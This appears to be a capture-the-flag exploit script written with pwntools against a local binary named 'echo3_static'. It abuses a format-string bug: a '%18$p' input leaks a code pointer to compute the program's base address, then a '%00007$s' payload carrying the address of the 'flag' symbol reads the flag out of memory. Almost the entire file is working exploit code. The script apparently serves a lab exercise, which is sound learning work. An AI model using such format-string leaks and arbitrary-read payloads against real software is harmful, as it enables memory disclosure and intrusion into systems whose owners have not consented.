from pwn import *

binary = context.binary = ELF('./echo3_static')

p = process(binary.path)

# # To check offset value
# p.recvuntil('Shout something:')
# for i in range(20):
#     p.sendline("AAAAAAAA %%%d$p" % i)
#     p.recvuntil('The cave echoes back: ')
#     print("%d - %s" % (i, p.recvuntil("\n", drop = True).decode()))

# get base address
p.recvuntil('Shout something:')
p.sendline(b'%18$p')
p.recvuntil(b'The cave echoes back:');
_start = int(p.recvline().strip(),16)
binary.address = _start - binary.sym._start
log.info('binary.address: ' + hex(binary.address))

# get flag
payload = b'%00007$s' + p64(binary.sym.flag)
print(payload)
p.recvuntil('Shout something:')
p.sendline(payload)
p.recvuntil('The cave echoes back: ')
flag = p.recvline()
print(flag)
p.close()